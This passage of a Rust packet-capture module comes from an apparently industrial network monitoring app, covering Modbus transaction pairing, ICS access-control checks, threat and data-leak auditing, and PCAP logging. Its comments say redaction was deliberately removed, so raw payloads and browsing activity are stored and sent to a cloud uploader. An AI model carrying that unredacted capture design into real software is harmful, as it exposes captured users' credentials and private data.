use pcap::{Active, Capture, Device, DeviceFlags};
use pnet::packet::arp::ArpPacket;
use pnet::packet::ethernet::{EtherTypes, EthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocol;
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::ipv6::Ipv6Packet;
use pnet::packet::tcp::TcpPacket;
use pnet::packet::udp::UdpPacket;
use pnet::packet::Packet as PnetPacket;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::HashMap;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use tauri::Emitter;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

use crate::analyzer;
use crate::dpi;
use crate::forensics::ForensicEngine;
use sha2::Digest;

/// 全局可观测指标计数器（供 metrics.rs Prometheus 暴露使用）
pub static GLOBAL_PACKETS_TOTAL: AtomicU64 = AtomicU64::new(0);
pub static GLOBAL_BYTES_TOTAL: AtomicU64 = AtomicU64::new(0);

/// 全局网络嗅探挂起/暂停原子标志（无损句柄热备，毫秒级流控）
pub static GLOBAL_SNIFFER_PAUSED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

pub fn pause_sniffer() {
    GLOBAL_SNIFFER_PAUSED.store(true, std::sync::atomic::Ordering::Relaxed);
}

pub fn resume_sniffer() {
    GLOBAL_SNIFFER_PAUSED.store(false, std::sync::atomic::Ordering::Relaxed);
}

pub fn is_sniffer_paused() -> bool {
    GLOBAL_SNIFFER_PAUSED.load(std::sync::atomic::Ordering::Relaxed)
}

#[derive(Clone, Serialize, Deserialize, Debug)]
pub struct PacketRecord {
    pub id: u64,
    pub timestamp: String,
    pub timestamp_ns: u128,
    pub direction: String,
    pub transport: String,
    pub protocol: String,
    pub src_ip: String,
    pub dst_ip: String,
    pub src_port: u16,
    pub dst_port: u16,
    pub length: usize,
    pub payload_hex: String,
    pub raw_frame_hex: String,
    pub entropy: f64,
    pub entropy_level: String,
    pub mac_src: String,
    pub mac_dst: String,
    pub chain_hash: String,
    pub business_data: Option<HashMap<String, serde_json::Value>>,
    pub raw_text: Option<String>,
}

static PACKET_COUNTER: AtomicU64 = AtomicU64::new(0);

/// 当前活动 TCP 连接数（双轨 + 蜜罐统一计数，供 Prometheus probe_active_connections 暴露）
pub static GLOBAL_ICS_ACL_ENGINE: once_cell::sync::Lazy<std::sync::Arc<std::sync::RwLock<crate::ics_acl::IcsAclEngine>>> = once_cell::sync::Lazy::new(|| {
    let mut engine = crate::ics_acl::IcsAclEngine::new(false);
    engine.add_rule(crate::ics_acl::IcsAclRule {
        rule_id: 1,
        name: "PREVENT_DIAGNOSTIC_RESTART".to_string(),
        protocol: crate::ics_acl::IcsProtocol::ModbusTcp,
        src_matcher: crate::ics_acl::IpMatcher::Any,
        dst_matcher: crate::ics_acl::IpMatcher::Any,
        allowed_unit_ids: None,
        allowed_functions: None,
        forbidden_functions: Some(vec![0x08]),
        allowed_register_ranges: None,
        action: crate::ics_acl::AclAction::Deny,
        severity: crate::threat_detector::ThreatSeverity::Critical,
    });
    std::sync::Arc::new(std::sync::RwLock::new(engine))
});

pub static GLOBAL_ACTIVE_CONNECTIONS: std::sync::atomic::AtomicI64 =
    std::sync::atomic::AtomicI64::new(0);

/// 全局司法防篡改区块链当前哈希锚点（单一全局链，所有记录产生点统一推进）
static GLOBAL_CHAIN_HASH: once_cell::sync::Lazy<Arc<Mutex<String>>> =
    once_cell::sync::Lazy::new(|| Arc::new(Mutex::new(String::from("GENESIS_BLOCK_ACADEMIC_INTEGRITY_2026"))));

/// 全局链式哈希推进（唯一收口）
/// 所有记录产生点（双轨/LAN/雷达/RawSocket/Npcap/重组流/串口/蜜罐/主动拉流）统一调用，
/// 保证证据链单一连续：chain[n] = SHA256(chain[n-1] | timestamp_ns | record_sig)
/// 返回本条记录的链哈希。合成记录（ARP 雷达）在 record_sig 中携带 SYNTHETIC 前缀显式标注。
pub fn advance_global_chain(ts_ns: u128, record_sig: &str) -> String {
    let mut gh = GLOBAL_CHAIN_HASH.lock().unwrap();
    let sig = format!("{}|{}|{}", *gh, ts_ns, record_sig);
    let h = format!("{:x}", sha2::Sha256::digest(sig.as_bytes()));
    *gh = h.clone();
    h
}

/// 工业级客观原始文本生成器（100% 还原真实网络流，不经过任何正则脱敏与屏蔽）
/// 脱敏体系已按"侦测捕获数据真实客观"原则彻底移除，本函数为唯一文本预览出口
pub fn generate_raw_text_preview(data: &[u8]) -> String {
    if data.is_empty() {
        return "[EMPTY PAYLOAD - 0 BYTES]".to_string();
    }
    if let Ok(text) = std::str::from_utf8(data) {
        text.to_string()
    } else {
        // 生成安全的 ASCII 混合点号视图并附带前缀十六进制转储
        let mut ascii_repr = String::with_capacity(data.len().min(64));
        for &b in data.iter().take(64) {
            if (32..=126).contains(&b) {
                ascii_repr.push(b as char);
            } else {
                ascii_repr.push('.');
            }
        }
        let hex_prefix = hex::encode(&data[..data.len().min(16)]);
        format!("[ASCII] {} | [HEX] {}", ascii_repr, hex_prefix)
    }
}

#[cfg(windows)]
pub fn is_npcap_driver_available() -> bool {
    unsafe {
        #[link(name = "kernel32")]
        extern "system" {
            fn LoadLibraryA(lpLibFileName: *const i8) -> usize;
            fn FreeLibrary(hLibModule: usize) -> i32;
        }
        let h = LoadLibraryA(b"wpcap.dll\0".as_ptr() as *const i8);
        if h != 0 {
            FreeLibrary(h);
            true
        } else {
            false
        }
    }
}

#[cfg(not(windows))]
pub fn is_npcap_driver_available() -> bool {
    true
}

/// 带硬超时的安全网卡枚举（防止 Npcap 在存在 VPN/虚拟网卡时无限期死锁）
pub fn safe_list_devices(timeout: Duration) -> Result<Vec<Device>, String> {
    if !is_npcap_driver_available() {
        return Err("Npcap 驱动未安装，系统已自动切换至 Windows 原生免驱 Raw Socket 模式".to_string());
    }
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        let res = Device::list();
        let _ = tx.send(res);
    });
    match rx.recv_timeout(timeout) {
        Ok(Ok(devs)) => Ok(devs),
        Ok(Err(e)) => Err(e.to_string()),
        Err(_) => Err("Device::list() 调用超时，底层驱动枚举挂起".to_string()),
    }
}

/// 获取可用网络接口列表（集成安全熔断与活动物理网卡回退机制）
pub fn list_network_interfaces() -> Result<Vec<String>, String> {
    // 1. 首先尝试在 300ms 内安全枚举 Npcap 设备
    if let Ok(devs) = safe_list_devices(Duration::from_millis(300)) {
        if !devs.is_empty() {
            let mut list: Vec<String> = devs
                .into_iter()
                .map(|d| format!("{} - {}", d.name, d.desc.unwrap_or_default()))
                .collect();
            list.insert(0, "auto - 自动选择活动物理网卡 (推荐)".into());
            return Ok(list);
        }
    }

    // 2. 若底层 Npcap 枚举超时或受限，采用系统物理适配器快速降级方案（不依赖任何硬编码设备 GUID）
    let mut fallback_list = vec![
        "auto - 自动选择活动物理网卡 (推荐)".to_string(),
        "dual-track - 双轨应用层多端口监听服务 (TCP/UDP 8080, 502, 1883)".to_string(),
    ];

    #[cfg(windows)]
    {
        if let Ok(output) = std::process::Command::new("netsh")
            .args(["interface", "show", "interface"])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output()
        {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines() {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 4 && parts[1] == "已连接" {
                    let iface_name = parts[3..].join(" ");
                    if !fallback_list.iter().any(|item| item.contains(&iface_name)) {
                        fallback_list.push(format!("system - {} (系统活动连接)", iface_name));
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name != "lo" && !fallback_list.iter().any(|item| item.starts_with(&name)) {
                    fallback_list.push(format!("{} - Linux 物理网络接口", name));
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        for name in ["en0", "en1", "en2"] {
            fallback_list.push(format!("{} - macOS 核心网络接口", name));
        }
    }

    Ok(fallback_list)
}

/// 工业事务状态机流水线处理 (对标 Zeek 双向会话配对)
pub fn process_industrial_transaction_step(
    app: &tauri::AppHandle,
    record: &PacketRecord,
    payload_bytes: &[u8],
) {
    if payload_bytes.is_empty() {
        return;
    }

    let proto = record.protocol.to_uppercase();
    if proto.contains("MODBUS") && payload_bytes.len() >= 8 {
        let trans_id = u16::from_be_bytes([payload_bytes[0], payload_bytes[1]]) as u32;
        let proto_id = u16::from_be_bytes([payload_bytes[2], payload_bytes[3]]);
        if proto_id != 0 {
            return;
        }
        let unit_id = payload_bytes[6];
        let func_code = payload_bytes[7];

        let flow_key = crate::industrial_transaction::IndustrialTransactionTracker::normalize_flow_key(
            &record.src_ip, record.src_port, &record.dst_ip, record.dst_port,
        );

        if let Ok(mut tracker) = crate::industrial_transaction::GLOBAL_TRANSACTION_TRACKER.lock() {
            // 判定方向: dst_port == 502 或请求报文
            if record.dst_port == 502 || (record.src_port != 502 && func_code < 0x80 && payload_bytes.len() >= 12) {
                let is_write = func_code == 0x05 || func_code == 0x06 || func_code == 0x0F || func_code == 0x10;
                let addr = if payload_bytes.len() >= 10 {
                    Some(u16::from_be_bytes([payload_bytes[8], payload_bytes[9]]) as u32)
                } else {
                    None
                };
                let qty = if payload_bytes.len() >= 12 {
                    Some(u16::from_be_bytes([payload_bytes[10], payload_bytes[11]]) as u32)
                } else {
                    None
                };
                let func_name = match func_code {
                    0x01 => "Read Coils",
                    0x02 => "Read Discrete Inputs",
                    0x03 => "Read Holding Registers",
                    0x04 => "Read Input Registers",
                    0x05 => "Write Single Coil",
                    0x06 => "Write Single Register",
                    0x0F => "Write Multiple Coils",
                    0x10 => "Write Multiple Registers",
                    _ => "Modbus Operation",
                }.to_string();

                tracker.record_request(
                    flow_key,
                    "MODBUS".into(),
                    trans_id,
                    unit_id,
                    record.id,
                    record.timestamp_ns,
                    record.timestamp.clone(),
                    func_code,
                    func_name,
                    addr,
                    qty,
                    is_write,
                    record.payload_hex.clone(),
                );
            } else {
                // 响应报文
                let is_exception = func_code >= 0x80;
                let exc_code = if is_exception && payload_bytes.len() >= 9 {
                    Some(payload_bytes[8])
                } else {
                    None
                };

                if let Some(completed) = tracker.record_response(
                    &flow_key,
                    &record.dst_ip, // 客户端
                    &record.src_ip, // 服务端 PLC
                    "MODBUS",
                    trans_id,
                    unit_id,
                    record.id,
                    record.timestamp_ns,
                    record.timestamp.clone(),
                    is_exception,
                    exc_code,
                ) {
                    let _ = app.emit("industrial-transaction-event", &completed);
                }
            }

            // 周期性超时扫描
            let timeouts = tracker.sweep_timeouts(record.timestamp_ns, crate::industrial_transaction::DEFAULT_TRANSACTION_TIMEOUT_MS);
            for t in timeouts {
                let _ = app.emit("industrial-transaction-timeout", &t);
            }
        }
    }
}

/// 统一数据处理与投递流水线（L2 嗅探与应用层双轨服务共用）
pub fn process_incoming_record(app: &tauri::AppHandle, mut record: PacketRecord) {
    // 0. 检查是否处于挂起/暂停状态（保持底层网卡驱动句柄热备，毫秒级跳过数据流与渲染）
    if GLOBAL_SNIFFER_PAUSED.load(std::sync::atomic::Ordering::Relaxed) {
        return;
    }

    // 资产画像更新：源端画像与端口
    crate::discovery::record_asset(&record.src_ip, &record.mac_src, &record.protocol, record.src_port);

    // 资产画像更新：目标端画像与服务端口（关键修复：避免服务端端口无法被沉淀为 NA）
    if record.dst_port > 0 {
        let inferred_proto = crate::discovery::infer_protocol_by_port(record.dst_port);
        let proto = if inferred_proto != "TCP_SERVICE" { inferred_proto } else { &record.protocol };
        crate::discovery::record_asset(&record.dst_ip, &record.mac_dst, proto, record.dst_port);
    }

    // 令牌桶限速检查：超频 IP 阻断
    if crate::throttle::check_and_throttle(&record.src_ip) {
        let _ = app.emit(
            "system-log",
            format!("[THROTTLE] 🚫 超频阻断: {} 已耗尽令牌桶", record.src_ip),
        );
        return;
    }

    // 全局指标更新
    GLOBAL_PACKETS_TOTAL.fetch_add(1, Ordering::Relaxed);
    GLOBAL_BYTES_TOTAL.fetch_add(record.length as u64, Ordering::Relaxed);

    // IO Graphs 高精时序与跨总线因果关联流水线
    crate::analyzer::record_packet_io(record.length, None, false);
    let payload_bytes = hex::decode(&record.payload_hex).unwrap_or_default();
    let bus_type = if record.transport == "SERIAL" || record.direction.starts_with("SERIAL") {
        "SERIAL"
    } else if record.transport == "USB" || record.direction.starts_with("USB") {
        "USB"
    } else {
        "ETHERNET"
    };
    crate::analyzer::record_cross_bus_event(bus_type, record.id, record.timestamp_ns, &record.protocol, &payload_bytes);

    // 1. IP 资产与地理情报自动打标 (Zero-Leakage 离线分析)
    if let Ok(ip_engine) = crate::ip_intelligence::GLOBAL_IP_ENGINE.lock() {
        let src_intel = ip_engine.classify(&record.src_ip);
        let dst_intel = ip_engine.classify(&record.dst_ip);

        let mut bdata = record.business_data.unwrap_or_default();
        bdata.insert("src_zone".to_string(), serde_json::Value::String(src_intel.zone_name));
        bdata.insert("dst_zone".to_string(), serde_json::Value::String(dst_intel.zone_name));
        bdata.insert("src_geo".to_string(), serde_json::Value::String(src_intel.geo_summary));
        bdata.insert("dst_geo".to_string(), serde_json::Value::String(dst_intel.geo_summary));
        if let Some(c) = src_intel.country {
            bdata.insert("src_country".to_string(), serde_json::Value::String(c));
        }
        if let Some(p) = src_intel.province {
            bdata.insert("src_province".to_string(), serde_json::Value::String(p));
        }
        if let Some(c) = src_intel.city {
            bdata.insert("src_city".to_string(), serde_json::Value::String(c));
        }
        if let Some(isp) = src_intel.isp {
            bdata.insert("src_isp".to_string(), serde_json::Value::String(isp));
        }
        record.business_data = Some(bdata);
    }

    // 2. 存入内存环形缓冲区 (固定内存配额，防 OOM)
    let raw_bytes = hex::decode(&record.raw_frame_hex).unwrap_or_else(|_| hex::decode(&record.payload_hex).unwrap_or_default());
    if let Ok(mut ring) = crate::pcap_engine::GLOBAL_RING_BUFFER.lock() {
        let ts_sec = (record.timestamp_ns / 1_000_000_000) as u32;
        let ts_usec = ((record.timestamp_ns % 1_000_000_000) / 1000) as u32;
        ring.push(crate::pcap_engine::RawPacketItem {
            id: record.id,
            timestamp_sec: ts_sec,
            timestamp_usec: ts_usec,
            original_len: record.length as u32,
            captured_len: raw_bytes.len() as u32,
            data: raw_bytes.clone(),
        });
    }

    // 3. 持续滚动落盘 (Rolling PCAPNG)
    if let Ok(mut writer) = crate::pcap_engine::GLOBAL_ROLLING_WRITER.lock() {
        let ts_sec = (record.timestamp_ns / 1_000_000_000) as u32;
        let ts_usec = ((record.timestamp_ns % 1_000_000_000) / 1000) as u32;
        let _ = writer.write_packet(&raw_bytes, ts_sec, ts_usec);
    }

    // 4. 双向会话流 (Biflow) 与 TCP 乱序重组引擎
    let payload_bytes = hex::decode(&record.payload_hex).unwrap_or_default();
    if let Ok(mut flow_engine) = crate::stream_reassembly::GLOBAL_FLOW_ENGINE.lock() {
        if record.transport == "TCP" {
            let seq = record.business_data.as_ref()
                .and_then(|m| m.get("sequence_number"))
                .and_then(|v| v.as_u64())
                .unwrap_or(0) as u32;
            let ack = record.business_data.as_ref()
                .and_then(|m| m.get("acknowledgment_number"))
                .and_then(|v| v.as_u64())
                .unwrap_or(0) as u32;
            let flags_raw = record.business_data.as_ref()
                .and_then(|m| m.get("tcp_flags_raw"))
                .and_then(|v| v.as_u64())
                .unwrap_or(0x10) as u8;
            let epoch_ms = (record.timestamp_ns / 1_000_000) as u64;

            flow_engine.process_tcp_packet(
                &record.src_ip,
                &record.dst_ip,
                record.src_port,
                record.dst_port,
                &record.transport,
                seq,
                ack,
                flags_raw,
                &payload_bytes,
                &record.timestamp,
                epoch_ms,
            );
        } else {
            flow_engine.process_packet(
                &record.src_ip,
                &record.dst_ip,
                record.src_port,
                record.dst_port,
                &record.transport,
                0,
                false,
                &payload_bytes,
                &record.timestamp,
            );
        }
    }

    // 示波器采样
    if !payload_bytes.is_empty() {
        analyzer::process_wave_sample(app, &record.src_ip, &payload_bytes);
    }

    // 异常行为分析
    if let Some(alert) = analyzer::check_anomaly(&record.src_ip, record.dst_port) {
        let _ = app.emit("ai-alert", alert);
    }

    // 4.5. 工业级上网行为监测与全息域名审计 (DNS / TLS SNI / HTTP / 关联反查)
    let geo_summary = record.business_data.as_ref()
        .and_then(|m| m.get("dst_geo"))
        .and_then(|v| v.as_str())
        .unwrap_or("未知归属地");
    crate::web_audit::audit_packet_activity(
        app,
        &record.src_ip,
        &record.dst_ip,
        &record.mac_src,
        record.src_port,
        record.dst_port,
        &record.protocol,
        &payload_bytes,
        geo_summary,
    );

    // 5. 工业通信基线白名单自学习与漂移检测 (等保三级 G.4.2)
    let is_modbus_write = record.business_data.as_ref()
        .and_then(|m| m.get("modbus_is_write_command"))
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    let is_cross_zone = {
        let bdata = record.business_data.as_ref();
        let s_z = bdata.and_then(|m| m.get("src_zone")).and_then(|v| v.as_str()).unwrap_or("");
        let d_z = bdata.and_then(|m| m.get("dst_zone")).and_then(|v| v.as_str()).unwrap_or("");
        !s_z.is_empty() && !d_z.is_empty() && s_z != d_z
    };

    let now_ms = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0);

    crate::baseline_learning::process_packet_for_baseline_temporal(
        app,
        &record.src_ip,
        &record.dst_ip,
        &record.protocol,
        record.dst_port,
        is_modbus_write,
        is_cross_zone,
        record.length,
        now_ms,
    );

    // 5a. 工业控制事务双向配对与 PLC 响应延迟度量 (对标 Zeek Transaction Engine)
    process_industrial_transaction_step(app, &record, &payload_bytes);

    // 6. 四维综合合规安全审查引擎挂接 (网络审查 / 数据安全 / 保密安全 / 违规外联)
    if !payload_bytes.is_empty() {
        // (1) 工控写指令与工业协议越权深度审查
        crate::audit_network::inspect_industrial_commands(
            &record.src_ip,
            &record.dst_ip,
            record.src_port,
            record.dst_port,
            &record.protocol,
            &payload_bytes,
        );

        // (2) ICMP 隐蔽隧道异常审查
        if record.protocol.eq_ignore_ascii_case("ICMP") || record.transport.eq_ignore_ascii_case("ICMP") {
            crate::audit_network::inspect_icmp_tunnel(
                &record.src_ip,
                &record.dst_ip,
                &payload_bytes,
            );
        }

        // (3) 数据安全审查与 PII 敏感信息识别 (GB/T 43697)
        crate::audit_data_security::inspect_data_security_payload(
            &record.src_ip,
            &record.dst_ip,
            record.src_port,
            record.dst_port,
            &record.protocol,
            &payload_bytes,
        );

        // (4) 文件还原与传输载荷 MIME 特征审计
        crate::audit_data_security::inspect_and_reconstruct_file(
            &record.src_ip,
            &record.dst_ip,
            &record.protocol,
            &payload_bytes,
        );

        // (5) 保密合规审查 (法定密级公文标识与红头公文字号审计)
        crate::audit_confidentiality::inspect_confidentiality_stream(
            &record.src_ip,
            &record.dst_ip,
            &record.protocol,
            &payload_bytes,
        );
    }

    // (6) 违规外联审查 (非授信外网连接与黑名单资产审计)
    crate::audit_confidentiality::inspect_egress_domain(&record.src_ip, &record.dst_ip);

    // (7) Aho-Corasick 多模式线速威胁特征深度扫描 (对标 Snort / Suricata Hyperscan)
    let threat_hits = if !payload_bytes.is_empty() {
        crate::threat_detector::detect_threats_in_payload(&payload_bytes)
    } else {
        Vec::new()
    };

    if !threat_hits.is_empty() {
        let mut bdata = record.business_data.take().unwrap_or_default();
        bdata.insert("threat_hits".into(), serde_json::to_value(&threat_hits).unwrap_or_default());
        bdata.insert("is_threat_detected".into(), serde_json::json!(true));
        record.business_data = Some(bdata);
        record.entropy_level = "critical".to_string();

        for hit in &threat_hits {
            let _ = app.emit("threat-detected", hit);
            crate::syslog::emit_syslog(
                1,
                &format!("[THREAT_DETECTED] [{}] {} (偏移: {}-{}, 规则ID: {})", 
                    hit.severity, hit.name, hit.match_start, hit.match_end, hit.signature_id
                )
            );
        }
    }

    // (7.5) 工控细粒度访问控制 (ICS-ACL) 状态机审计 (对标 IEC 62443 工业分区防护)
    if record.protocol.to_uppercase().contains("MODBUS") && !payload_bytes.is_empty() {
        if let (Ok(s_ip), Ok(d_ip)) = (
            record.src_ip.parse::<std::net::IpAddr>(),
            record.dst_ip.parse::<std::net::IpAddr>(),
        ) {
            let unit_id = payload_bytes.get(6).copied();
            let func_code = payload_bytes.get(7).copied();
            let start_addr = if payload_bytes.len() >= 10 {
                Some(u16::from_be_bytes([payload_bytes[8], payload_bytes[9]]))
            } else {
                None
            };
            let is_write = func_code.map(|f| f == 0x05 || f == 0x06 || f == 0x0F || f == 0x10).unwrap_or(false);

            let ctx = crate::ics_acl::IcsInspectionContext {
                protocol: crate::ics_acl::IcsProtocol::ModbusTcp,
                src_ip: s_ip,
                dst_ip: d_ip,
                unit_id,
                function_code: func_code,
                start_address: start_addr,
                quantity: None,
                is_write_operation: is_write,
            };

            if let Ok(acl_guard) = GLOBAL_ICS_ACL_ENGINE.read() {
                let decision = acl_guard.evaluate(&ctx);
                if decision.is_violation {
                    let mut bdata = record.business_data.take().unwrap_or_default();
                    bdata.insert("ics_acl_violation".into(), serde_json::to_value(&decision).unwrap_or_default());
                    record.business_data = Some(bdata);
                    record.entropy_level = "critical".to_string();

                    let reason = decision.violation_reason.unwrap_or_else(|| "工控未授权越权访问".to_string());
                    let _ = app.emit("ics-acl-violation", serde_json::json!({
                        "packet_id": record.id,
                        "src_ip": record.src_ip,
                        "dst_ip": record.dst_ip,
                        "unit_id": unit_id,
                        "function_code": func_code,
                        "reason": reason,
                    }));
                    crate::syslog::emit_syslog(
                        2,
                        &format!("[ICS_ACL_VIOLATION] {} -> {} | {}", record.src_ip, record.dst_ip, reason),
                    );
                }
            }
        }
    }

    // (7.6) 以太网-串口-USB 跨总线级联事务追踪 (对标 sigrok 跨物理总线关联)
    if record.protocol.to_uppercase().contains("MODBUS") && !payload_bytes.is_empty() {
        let is_resp = payload_bytes.len() >= 8 && (payload_bytes[7] & 0x80 != 0 || (payload_bytes.len() > 8 && payload_bytes[8] != 0));
        if is_resp {
            crate::cross_bus_diagnostic::GLOBAL_CASCADE_DIAGNOSTIC_ENGINE.record_response(
                crate::cross_bus_diagnostic::BusType::Ethernet,
                record.id,
                record.timestamp_ns,
                &record.protocol,
                &payload_bytes,
            );
        } else {
            crate::cross_bus_diagnostic::GLOBAL_CASCADE_DIAGNOSTIC_ENGINE.record_request(
                crate::cross_bus_diagnostic::BusType::Ethernet,
                record.id,
                record.timestamp_ns,
                &record.protocol,
                &payload_bytes,
            );
        }
    }
    // (9) 多分辨率时序指标流与工业拓扑热力雷达收口 (TASK-17)
    let is_industrial = matches!(
        record.protocol.to_uppercase().as_str(),
        "MODBUS" | "MODBUS_TCP" | "MODBUS-RTU" | "S7COMM" | "PROFINET" | "ETHERCAT" | "ENIP" | "OPCUA" | "IEC104" | "DNP3" | "BACNET" | "DL/T 645"
    );
    let is_threat = record.entropy_level == "critical" 
        || record.business_data.as_ref().map_or(false, |b| b.contains_key("ics_acl_violation") || b.contains_key("threat_hit"));
    let is_write = record.business_data.as_ref().map_or(false, |b| {
        b.get("is_write").and_then(|v| v.as_bool()).unwrap_or(false)
            || b.get("modbus_tcp").and_then(|m| m.get("is_write")).and_then(|v| v.as_bool()).unwrap_or(false)
    });
    let timestamp_s = (record.timestamp_ns / 1_000_000_000) as u64;

    crate::metrics_timeseries::GLOBAL_TIMESERIES_POOL.record_packet(
        timestamp_s,
        record.length as u64,
        is_industrial,
        is_write,
        is_threat,
    );
    if !record.src_ip.is_empty() && !record.dst_ip.is_empty() {
        crate::metrics_timeseries::GLOBAL_TOPOLOGY_HEATMAP.record_interaction(
            &record.src_ip,
            &record.dst_ip,
            record.length as u64,
            is_industrial,
            is_write,
            is_threat,
            record.timestamp_ns,
        );
    }

    // 云端微批次上报
    let _ = crate::cloud::emit_record(serde_json::to_value(&record).unwrap_or_default());

    // 结构化底账落盘（received_data.jsonl，30 天轮转）——全记录统一收口
    if let Ok(line) = serde_json::to_string(&record) {
        crate::forensics::write_jsonl_record(&line);
    }

    // (8) 异步流式分页缓冲与自动分卷 PCAPng 滚动落盘 (解耦 IPC，保障百万级流量有界内存)
    crate::stream_paging::buffer_packet_and_auto_flush(record.clone());

    // 推送前端渲染
    let _ = app.emit("packet-received", &record);
}

/// 动态探测本机物理活动主网卡的 IPv4 地址与子网掩码 (IP, Netmask)
/// 严格杜绝写死 192.168.1.114，科学适配 10.x / 172.16-31.x / 192.168.x 等任意网段
/// 根据目标 IP 动态查询系统对应的子网掩码（优先从 netsh / /sys/class/net 匹配，缺失时依据 RFC 1918 科学推导）
fn detect_netmask_for_ip(target_ip: &std::net::Ipv4Addr) -> std::net::Ipv4Addr {
    #[cfg(windows)]
    {
        if let Ok(output) = std::process::Command::new("netsh")
            .args(["interface", "ipv4", "show", "addresses"])
            .creation_flags(0x08000000)
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            let target_str = target_ip.to_string();
            let mut matched_target = false;
            for line in text.lines() {
                let trimmed = line.trim();
                if trimmed.contains(&target_str) {
                    matched_target = true;
                }
                if matched_target && (trimmed.contains("子网前缀") || trimmed.contains("Subnet Prefix")) {
                    if let Some(mask_start) = trimmed.find("掩码 ") {
                        let mask_part = &trimmed[mask_start + 7..];
                        if let Some(mask_end) = mask_part.find(')') {
                            if let Ok(m) = mask_part[..mask_end].trim().parse::<std::net::Ipv4Addr>() {
                                return m;
                            }
                        }
                    } else if let Some(mask_start) = trimmed.find("mask ") {
                        let mask_part = &trimmed[mask_start + 5..];
                        if let Some(mask_end) = mask_part.find(')') {
                            if let Ok(m) = mask_part[..mask_end].trim().parse::<std::net::Ipv4Addr>() {
                                return m;
                            }
                        }
                    }
                }
            }
        }
    }

    // RFC 1918 及常规默认掩码科学推导（A类 /8, B类 /16, C类 /24）
    let oct = target_ip.octets();
    if oct[0] == 10 {
        std::net::Ipv4Addr::new(255, 0, 0, 0)
    } else if oct[0] == 172 && (16..=31).contains(&oct[1]) {
        std::net::Ipv4Addr::new(255, 240, 0, 0)
    } else {
        std::net::Ipv4Addr::new(255, 255, 255, 0)
    }
}

/// 动态获取系统当前默认网关 IP（若存在）
pub fn detect_default_gateway() -> Option<std::net::Ipv4Addr> {
    #[cfg(windows)]
    {
        if let Ok(output) = std::process::Command::new("netsh")
            .args(["interface", "ipv4", "show", "addresses"])
            .creation_flags(0x08000000)
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines() {
                let trimmed = line.trim();
                if trimmed.contains("默认网关") || trimmed.contains("Default Gateway") {
                    if let Some(gw_str) = trimmed.split(':').nth(1) {
                        let gw = gw_str.trim();
                        if let Ok(ip) = gw.parse::<std::net::Ipv4Addr>() {
                            if !ip.is_unspecified() && !ip.is_loopback() {
                                return Some(ip);
                            }
                        }
                    }
                }
            }
        }
    }
    None
}

/// 动态探测本机物理活动主网卡的 IPv4 地址与子网掩码 (IP, Netmask)
/// 严格遵循网络工程标准：内核路由裁决优先，科学自适应 10.x / 172.x / 192.168.x 等任意网段，零硬编码
pub fn detect_primary_ipv4_and_subnet() -> (std::net::Ipv4Addr, std::net::Ipv4Addr) {
    // 1. 在 Windows 体系下，优先深度解析真实物理局域网网卡（以太网/Wi-Fi），绝不被 VPN 隧道/代理虚拟网卡（如 10.10.x.x）误导
    #[cfg(windows)]
    {
        if let Ok(output) = std::process::Command::new("netsh")
            .args(["interface", "ipv4", "show", "addresses"])
            .creation_flags(0x08000000)
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            let mut candidates: Vec<(i32, std::net::Ipv4Addr, std::net::Ipv4Addr)> = Vec::new();

            let splitter = if text.contains("接口 ") { "接口 " } else { "Interface " };
            for block in text.split(splitter) {
                if block.trim().is_empty() {
                    continue;
                }
                let mut iface_name = String::new();
                let mut ip_opt: Option<std::net::Ipv4Addr> = None;
                let mut mask_opt = std::net::Ipv4Addr::new(255, 255, 255, 0);
                let mut has_valid_gateway = false;

                for line in block.lines() {
                    let trimmed = line.trim();
                    if iface_name.is_empty() {
                        if let Some(quote_start) = trimmed.find('"') {
                            if let Some(quote_end) = trimmed[quote_start + 1..].find('"') {
                                iface_name = trimmed[quote_start + 1..quote_start + 1 + quote_end].to_lowercase();
                            }
                        }
                    }

                    if trimmed.contains("IP 地址") || trimmed.contains("IP Address") {
                        if let Some(ip_str) = trimmed.split(':').nth(1) {
                            if let Ok(ip) = ip_str.trim().parse::<std::net::Ipv4Addr>() {
                                let oct = ip.octets();
                                if oct[0] != 127 && (oct[0] != 169 || oct[1] != 254) {
                                    ip_opt = Some(ip);
                                }
                            }
                        }
                    } else if trimmed.contains("子网前缀") || trimmed.contains("Subnet Prefix") {
                        if let Some(mask_start) = trimmed.find("掩码 ") {
                            let mask_part = &trimmed[mask_start + 7..];
                            if let Some(mask_end) = mask_part.find(')') {
                                if let Ok(m) = mask_part[..mask_end].trim().parse::<std::net::Ipv4Addr>() {
                                    mask_opt = m;
                                }
                            }
                        } else if let Some(mask_start) = trimmed.find("mask ") {
                            let mask_part = &trimmed[mask_start + 5..];
                            if let Some(mask_end) = mask_part.find(')') {
                                if let Ok(m) = mask_part[..mask_end].trim().parse::<std::net::Ipv4Addr>() {
                                    mask_opt = m;
                                }
                            }
                        }
                    } else if trimmed.contains("默认网关") || trimmed.contains("Default Gateway") {
                        if let Some(gw_str) = trimmed.split(':').nth(1) {
                            let gw = gw_str.trim();
                            if !gw.is_empty() && gw != "0.0.0.0" && gw != "None" {
                                has_valid_gateway = true;
                            }
                        }
                    }
                }

                if let Some(ip) = ip_opt {
                    let mut score = 0i32;
                    if iface_name.contains("loopback") || iface_name.contains("pseudo") {
                        continue;
                    }
                    // 真实物理以太网/Wi-Fi 特征强加分
